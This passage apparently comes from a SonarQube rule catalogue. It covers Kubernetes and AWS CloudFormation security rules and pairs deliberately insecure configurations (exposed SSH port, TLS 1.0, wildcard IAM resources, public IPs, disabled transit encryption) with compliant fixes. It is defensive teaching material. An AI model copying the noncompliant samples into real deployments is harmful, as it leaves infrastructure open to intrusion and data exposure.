vulnerabilities, hard-coded credentials, or other security issues that increase the attack surface of a Kubernetes deployment. Even if the ports of
the services do not get forwarded to the host system, by default they are reachable from other containers in the same network. A malicious actor that
gets access to one container could use such services to escalate access and privileges.</p>
<p>If the administrative port is forwarded through a load balancer, then in most cases this port should be removed from the configuration to make sure
it is not reachable externally. Setting the <code>containerPort</code> on a pod is purely informative. Therefore, removing the property is not
sufficient to be secure. The port is still open and the service is still accessible.</p>
<p>In both cases, it is most secure to not start any administrative services in deployments. Instead, try to access the required information using
Kubernetes’s own administrative tools. For example, to execute code inside a container, <code>kubectl exec</code> can be used. If the administration
service is included to access logs, Kubernetes suggests using a sidecar container with a logging agent.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The pod starts an administrative service. </li>
</ul>
<p>There is a risk if you answered yes to the question.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Do not start SSH, VNC, RDP or similar administrative services in pods. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
apiVersion: v1
kind: Pod
metadata:
    labels:
        app: example_app
spec:
  containers:
    - name: applications
      image: my_image_with_ssh
      ports:
      - containerPort: 22  # NonCompliant: Merely informative, removing this property does not
                           # close port 22.
</pre>
<pre>
apiVersion: apps/v1
kind: Service
metadata:
  name: example_lb
spec:
  type: LoadBalancer
  ports:
    - port: 8022
      targetPort: 22  # Compliant
  selector:
    app: example_app
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
  <li> <a href="https://kubernetes.io/docs/concepts/cluster-administration/logging/#sidecar-container-with-logging-agent">Kubernetes</a> - Logging
  Architecture: Using a sidecar container with the logging agent </li>
  <li> <a href="https://kubernetes.io/docs/tasks/debug/debug-application/get-shell-running-container/">Kubernetes</a> - Get a Shell to a Running
  Container </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kubernetes:S6870">
              kubernetes:S6870
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Ephemeral storage is a type of storage that is temporary and non-persistent, meaning it does not retain data once the process is terminated. In the
context of Kubernetes, ephemeral storage is used for storing temporary files that a running container can write and read.</p>
<p>The issue at hand pertains to the creation of a container without any defined limits for this ephemeral storage. This means that the container can
potentially consume as much ephemeral storage as is available on the node where it is running.</p>
<h3>What is the potential impact?</h3>
<h4>Resource exhaustion</h4>
<p>Without a defined limit, a container can consume all available ephemeral storage on a node. This can lead to resource exhaustion, where no more
storage is available for other containers or processes running on the same node. This could cause these other containers or processes to fail or
perform poorly.</p>
<h4>Unpredictable application behavior</h4>
<p>If a container exhausts the available ephemeral storage, it can lead to unpredictable application behavior. For instance, if an application
attempts to write to the ephemeral storage and there is no space left, it may crash or exhibit other unexpected behaviors.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
apiVersion: v1
kind: Pod
metadata:
  name: example
spec:
  containers:
    - name: web # Noncompliant
      image: nginx
      volumeMounts:
        - name: ephemeral
          mountPath: "/tmp"
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
apiVersion: v1
kind: Pod
metadata:
  name: example
spec:
  containers:
    - name: web
      image: nginx
      resources:
        limits:
          ephemeral-storage: "2Gi"
      volumeMounts:
        - name: ephemeral
          mountPath: "/tmp"
</pre>
<h3>How does this work?</h3>
<p>A limit can be set through the property <code>resources.limits.ephemeral-storage</code> of a container. Alternatively, a default limit for a
namespace can be set with <code>LimitRange</code>.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> Kubernetes Documentation - <a href="https://kubernetes.io/docs/concepts/configuration/manage-resources-containers/">Resource Management for
  Pods and Containers</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/770">CWE-770 - Allocation of Resources Without Limits or Throttling</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6327">
              cloudformation:S6327
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Simple Notification Service (SNS) is a managed messaging service for application-to-application (A2A) and application-to-person (A2P)
communication. SNS topics allows publisher systems to fanout messages to a large number of subscriber systems. Amazon SNS allows to encrypt messages
when they are received. In the case that adversaries gain physical access to the storage medium or otherwise leak a message they are not able to
access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The topic contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt SNS topics that contain sensitive information. Encryption and decryption are handled transparently by SNS, so no
further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-sns-topic.html">AWS::SNS::Topic</a>:</p>
<pre>
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  Topic:  # Sensitive, encryption disabled by default
    Type: AWS::SNS::Topic
    Properties:
      DisplayName: "unencrypted_topic"
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-sns-topic.html">AWS::SNS::Topic</a>:</p>
<pre>
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  Topic:
    Type: AWS::SNS::Topic
    Properties:
      DisplayName: "encrypted_topic"
      KmsMasterKeyId:
        Fn::GetAtt:
          - TestKey
          - KeyId
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/sns/latest/dg/sns-server-side-encryption.html">AWS Documentation</a> - Encryption at rest </li>
  <li> <a href="https://aws.amazon.com/blogs/compute/encrypting-messages-published-to-amazon-sns-with-aws-kms/">Encrypting messages published to
  Amazon SNS with AWS KMS</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S4423">
              cloudformation:S4423
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are
all considered weak by the cryptographic community, and are officially deprecated:</p>
<ul>
  <li> SSL versions 1.0, 2.0 and 3.0 </li>
  <li> TLS versions 1.0 and 1.1 </li>
</ul>
<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform
mathematical attacks on this data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in API Gateway</h2>
<h3>Code examples</h3>
<p>These code samples illustrate how to fix this issue in both APIGateway and ApiGatewayV2.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  CustomApi:
    Type: AWS::ApiGateway::DomainName
    Properties:
      SecurityPolicy: "TLS_1_0"  # Noncompliant
</pre>
<p>The ApiGatewayV2 uses a weak TLS version by default:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  CustomApi: # Noncompliant
    Type: AWS::ApiGatewayV2::DomainName
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  CustomApi:
    Type: AWS::ApiGateway::DomainName
    Properties:
      SecurityPolicy: "TLS_1_2"
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  CustomApi:
    Type: AWS::ApiGatewayV2::DomainName
    Properties:
      DomainNameConfigurations:
        - SecurityPolicy: "TLS_1_2"
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic
community.</p>
<p>The best choices at the moment are the following.</p>
<h4>Use TLS v1.2 or TLS v1.3</h4>
<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br></p>
<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not
yet have TLS v1.3 support.</p>
<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are
deprecated as insecure.</p>
<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS
versions, and improves performance.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6304">
              cloudformation:S6304
            </a>
          </td>
          <td>
            <details>
              <p>A policy that allows identities to access all resources in an AWS account may violate <a
href="https://en.wikipedia.org/wiki/Principle_of_least_privilege">the principle of least privilege</a>. Suppose an identity has permission to access
all resources even though it only requires access to some non-sensitive ones. In this case, unauthorized access and disclosure of sensitive
information will occur.</p>
<h2>Ask Yourself Whether</h2>
<p>The AWS account has more than one resource with different levels of sensitivity.</p>
<p>A risk exists if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to apply the least privilege principle, i.e., by only granting access to necessary resources. A good practice to achieve this is
to organize or <a
href="https://aws.amazon.com/blogs/security/simplify-granting-access-to-your-aws-resources-by-using-tags-on-aws-iam-users-and-roles/">tag</a>
resources depending on the sensitivity level of data they store or process. Therefore, managing a secure access control is less prone to errors.</p>
<h2>Sensitive Code Example</h2>
<p>Update permission is granted for all policies using the wildcard (*) in the <code>Resource</code> property:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  ExamplePolicy:
    Type: AWS::IAM::ManagedPolicy
    Properties:
        PolicyDocument:
            Version: "2012-10-17"
            Statement:
                - Effect: Allow
                  Action:
                    - "iam:CreatePolicyVersion"
                  Resource:
                    - "*" # Sensitive
        Roles:
            - !Ref MyRole
</pre>
<h2>Compliant Solution</h2>
<p>Restrict update permission to the appropriate subset of policies:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  ExamplePolicy:
    Type: AWS::IAM::ManagedPolicy
    Properties:
        PolicyDocument:
            Version: "2012-10-17"
            Statement:
                - Effect: Allow
                  Action:
                    - "iam:CreatePolicyVersion"
                  Resource:
                    - !Sub "arn:aws:iam::${AWS::AccountId}:policy/team1/*"
        Roles:
            - !Ref MyRole
</pre>
<h2>Exceptions</h2>
<ul>
  <li> Should not be raised on key policies (when AWS KMS actions are used.) </li>
  <li> Should not be raised on policies not using any resources (if and only if all actions in the policy never require resources.) </li>
</ul>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege">AWS Documentation</a> - Grant least
  privilege </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6249">
              cloudformation:S6249
            </a>
          </td>
          <td>
            <details>
              <p>By default, S3 buckets can be accessed through HTTP and HTTPs protocols.</p>
<p>As HTTP is a clear-text protocol, it lacks the encryption of transported data, as well as the capability to build an authenticated connection. It
means that a malicious actor who is able to intercept traffic from the network can read, modify or corrupt the transported content.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The S3 bucket stores sensitive information. </li>
  <li> The infrastructure has to comply with AWS Foundational Security Best Practices standard. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to deny all HTTP requests:</p>
<ul>
  <li> for all objects (<code>*</code>) of the bucket </li>
  <li> for all principals (<code>*</code>) </li>
  <li> for all actions (<code>*</code>) </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>No secure policy is attached to this S3 bucket:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3Bucket:
    Type: 'AWS::S3::Bucket' # Sensitive
</pre>
<p>A policy is defined but forces only HTTPs communication for some users:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3Bucket:
    Type: 'AWS::S3::Bucket' # Sensitive
    Properties:
      BucketName: "mynoncompliantbucket"

  S3BucketPolicy:
    Type: 'AWS::S3::BucketPolicy'
    Properties:
      Bucket: !Ref S3Bucket
      PolicyDocument:
        Version: "2012-10-17"
        Statement:
          - Effect: Deny
            Principal:
              AWS: # Sensitive: only one principal is forced to use https
                - 'arn:aws:iam::123456789123:root'
            Action: "*"
            Resource: arn:aws:s3:::mynoncompliantbuckets6249/*
            Condition:
              Bool:
                "aws:SecureTransport": false
</pre>
<h2>Compliant Solution</h2>
<p>A secure policy that denies the use of all HTTP requests:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3Bucket:
    Type: 'AWS::S3::Bucket' # Compliant
    Properties:
      BucketName: "mycompliantbucket"

  S3BucketPolicy:
    Type: 'AWS::S3::BucketPolicy'
    Properties:
      Bucket: "mycompliantbucket"
      PolicyDocument:
        Version: "2012-10-17"
        Statement:
          - Effect: Deny
            Principal:
              AWS: "*" # all principals should use https
            Action: "*" # for any actions
            Resource: arn:aws:s3:::mycompliantbucket/* # for any resources
            Condition:
              Bool:
                "aws:SecureTransport": false
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html#transit">AWS documentation</a> - Enforce encryption
  of data in transit </li>
  <li> <a href="https://docs.aws.amazon.com/securityhub/latest/userguide/securityhub-standards-fsbp-controls.html#fsbp-s3-5">AWS Foundational Security
  Best Practices controls</a> - S3 buckets should require requests to use Secure Socket Layer </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/319">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6329">
              cloudformation:S6329
            </a>
          </td>
          <td>
            <details>
              <p>Enabling public network access to cloud resources can affect an organization’s ability to protect its data or internal operations from data theft
or disruption.</p>
<p>Depending on the component, inbound access from the Internet can be enabled via:</p>
<ul>
  <li> a boolean value that explicitly allows access to the public network. </li>
  <li> the assignment of a public IP address. </li>
  <li> database firewall rules that allow public IP ranges. </li>
</ul>
<p>Deciding to allow public access may happen for various reasons such as for quick maintenance, time saving, or by accident.</p>
<p>This decision increases the likelihood of attacks on the organization, such as:</p>
<ul>
  <li> data breaches. </li>
  <li> intrusions into the infrastructure to permanently steal from it. </li>
  <li> and various malicious traffic, such as DDoS attacks. </li>
</ul>
<h2>Ask Yourself Whether</h2>
<p>This cloud resource:</p>
<ul>
  <li> should be publicly accessible to any Internet user. </li>
  <li> requires inbound traffic from the Internet to function properly. </li>
</ul>
<p>There is a risk if you answered no to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid publishing cloud services on the Internet unless they are intended to be publicly accessible, such as customer portals or e-commerce
sites.</p>
<p>Use private networks (and associated private IP addresses) and VPC peering or other secure communication tunnels to communicate with other cloud
components.</p>
<p>The goal is to prevent the component from intercepting traffic coming in via the public IP address. If the cloud resource does not support the
absence of a public IP address, assign a public IP address to it, but do not create listeners for the public IP address.</p>
<h2>Sensitive Code Example</h2>
<p>DMS and EC2 instances have a public IP address assigned to them:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  DMSInstance:
    Type: AWS::DMS::ReplicationInstance
    Properties:
      PubliclyAccessible: true # sensitive, by default it's also set to true

  EC2Instance:
    Type: AWS::EC2::Instance
    Properties:
      NetworkInterfaces:
        - AssociatePublicIpAddress: true # sensitive, by default it's also set to true
          DeviceIndex: "0"
</pre>
<h2>Compliant Solution</h2>
<p>DMS and EC2 instances doesn’t have a public IP address:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  DMSInstance:
    Type: AWS::DMS::ReplicationInstance
    Properties:
      PubliclyAccessible: false

  EC2Instance:
    Type: AWS::EC2::Instance
    Properties:
      NetworkInterfaces:
        - AssociatePublicIpAddress: false
          DeviceIndex: "0"
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html">AWS Documentation</a> - Amazon EC2 instance IP
  addressing </li>
  <li> <a href="https://docs.aws.amazon.com/dms/latest/userguide/CHAP_ReplicationInstance.PublicPrivate.html">AWS Documentation</a> - Public and
  private replication instances </li>
  <li> <a href="https://docs.aws.amazon.com/vpc/latest/peering/what-is-vpc-peering.html">AWS Documentation</a> - VPC Peering </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/668">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6245">
              cloudformation:S6245
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Server-side encryption (SSE) encrypts an object (not the metadata) as it is written to disk (where the S3 bucket resides) and decrypts it as it is
read from disk. This doesn’t change the way the objects are accessed, as long as the user has the necessary permissions, objects are retrieved as if
they were unencrypted. Thus, SSE only helps in the event of disk thefts, improper disposals of disks and other attacks on the AWS infrastructure
itself.</p>
<p>There are three SSE options:</p>
<ul>
  <li> Server-Side Encryption with Amazon S3-Managed Keys (SSE-S3)
    <ul>
      <li> AWS manages encryption keys and the encryption itself (with AES-256) on its own. </li>
    </ul>  </li>
  <li> Server-Side Encryption with Customer Master Keys (CMKs) Stored in AWS Key Management Service (SSE-KMS)
    <ul>
      <li> AWS manages the encryption (AES-256) of objects and encryption keys provided by the AWS KMS service. </li>
    </ul>  </li>
  <li> Server-Side Encryption with Customer-Provided Keys (SSE-C)
    <ul>
      <li> AWS manages only the encryption (AES-256) of objects with encryption keys provided by the customer. AWS doesn’t store the customer’s
      encryption keys. </li>
    </ul>  </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The S3 bucket stores sensitive information. </li>
  <li> The infrastructure needs to comply to some regulations, like HIPAA or PCI DSS, and other standards. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to use SSE. Choosing the appropriate option depends on the level of control required for the management of encryption keys.</p>
<h2>Sensitive Code Example</h2>
<p>Server-side encryption is not used:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3Bucket:
    Type: 'AWS::S3::Bucket' # Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Server-side encryption with Amazon S3-Managed Keys is used:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3Bucket:
    Type: 'AWS::S3::Bucket' # Compliant
    Properties:
      BucketEncryption:
        ServerSideEncryptionConfiguration:
          - ServerSideEncryptionByDefault:
              SSEAlgorithm: AES256
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/serv-side-encryption.html">AWS documentation</a> - Protecting data using
  server-side encryption </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S5332">
              cloudformation:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul>
  <li> sensitive data exposure </li>
  <li> traffic redirected to a malicious endpoint </li>
  <li> malware-infected software update or installer </li>
  <li> execution of client-side code </li>
  <li> corruption of critical information </li>
</ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul>
  <li> bypassing isolation mechanisms </li>
  <li> compromising a component of the network </li>
  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>
</ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a
href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169">CVE-2019-6169</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327">CVE-2019-12327</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065">CVE-2019-11065</a> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li>
  <li> Application data transits over an untrusted network. </li>
  <li> Compliance rules require the service to encrypt data in transit. </li>
  <li> Your application renders web pages with a relaxed mixed content policy. </li>
  <li> OS-level protections against clear-text traffic are deactivated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul>
      <li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li>
      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>
      <li> Use <code>https</code> instead of <code>http</code>. </li>
      <li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li>
    </ul>  </li>
  <li> Enable encryption of cloud components communications whenever it is possible. </li>
  <li> Configure your application to block mixed content when rendering web pages. </li>
  <li> If available, enforce OS-level deactivation of all clear-text traffic. </li>
</ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://aws.amazon.com/kinesis/">AWS Kinesis</a> Data Streams, server-side encryption is disabled by default:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  KinesisStream: # Sensitive
    Type: AWS::Kinesis::Stream
    Properties:
      ShardCount: 1
      # No StreamEncryption
</pre>
<p>For <a href="https://aws.amazon.com/elasticache/">Amazon ElastiCache</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  Example:
    Type: AWS::ElastiCache::ReplicationGroup
    Properties:
      ReplicationGroupId: "example"
      TransitEncryptionEnabled: false  # Sensitive
</pre>
<p>For <a href="https://aws.amazon.com/ecs/">Amazon ECS</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  EcsTask:
    Type: AWS::ECS::TaskDefinition
    Properties:
      Family: "service"
      Volumes:
        -
          Name: "storage"
          EFSVolumeConfiguration:
            FilesystemId: !Ref FS
            TransitEncryption: "DISABLED"  # Sensitive
</pre>
<p>For <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html">AWS Load Balancer Listeners</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  HTTPlistener:
   Type: "AWS::ElasticLoadBalancingV2::Listener"
   Properties:
     DefaultActions:
       - Type: "redirect"
         RedirectConfig:
           Protocol: "HTTP"
     Protocol: "HTTP" # Sensitive
</pre>
<p>For <a href="https://docs.aws.amazon.com/opensearch-service/index.html">Amazon OpenSearch domains</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  Example:
    Type: AWS::OpenSearchService::Domain
    Properties:
      DomainName: example
      DomainEndpointOptions:
        EnforceHTTPS: false # Sensitive
      NodeToNodeEncryptionOptions:
        Enabled: false # Sensitive
</pre>
<p>For <a href="https://aws.amazon.com/msk/">Amazon MSK</a> communications between clients and brokers:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  MSKCluster:
    Type: 'AWS::MSK::Cluster'
    Properties:
      ClusterName: MSKCluster
      EncryptionInfo:
        EncryptionInTransit:
          ClientBroker: TLS_PLAINTEXT # Sensitive
          InCluster: false # Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://aws.amazon.com/kinesis/">AWS Kinesis</a> Data Streams server-side encryption:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  KinesisStream:
    Type: AWS::Kinesis::Stream
    Properties:
      ShardCount: 1
      StreamEncryption:
         EncryptionType: KMS
</pre>
<p>For <a href="https://aws.amazon.com/elasticache/">Amazon ElastiCache</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  Example:
    Type: AWS::ElastiCache::ReplicationGroup
    Properties:
      ReplicationGroupId: "example"
      TransitEncryptionEnabled: true
</pre>
<p>For <a href="https://aws.amazon.com/ecs/">Amazon ECS</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  EcsTask:
    Type: AWS::ECS::TaskDefinition
    Properties:
      Family: "service"
      Volumes:
        -
          Name: "storage"
          EFSVolumeConfiguration:
            FilesystemId: !Ref FS
            TransitEncryption: "ENABLED"
</pre>
<p>For <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html">AWS Load Balancer Listeners</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  HTTPlistener:
   Type: "AWS::ElasticLoadBalancingV2::Listener"
   Properties:
     DefaultActions:
       - Type: "redirect"
         RedirectConfig:
           Protocol: "HTTPS"
     Protocol: "HTTP"
</pre>
<p>For <a href="https://docs.aws.amazon.com/opensearch-service/index.html">Amazon OpenSearch domains</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  Example:
    Type: AWS::OpenSearchService::Domain
    Properties:
      DomainName: example
      DomainEndpointOptions:
        EnforceHTTPS: true
      NodeToNodeEncryptionOptions:
        Enabled: true
</pre>
<p>For <a href="https://aws.amazon.com/msk/">Amazon MSK</a> communications between clients and brokers, data in transit is encrypted by default,
allowing you to omit writing the <code>EncryptionInTransit</code> configuration. However, if you need to configure it explicitly, this configuration
is compliant:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  MSKCluster:
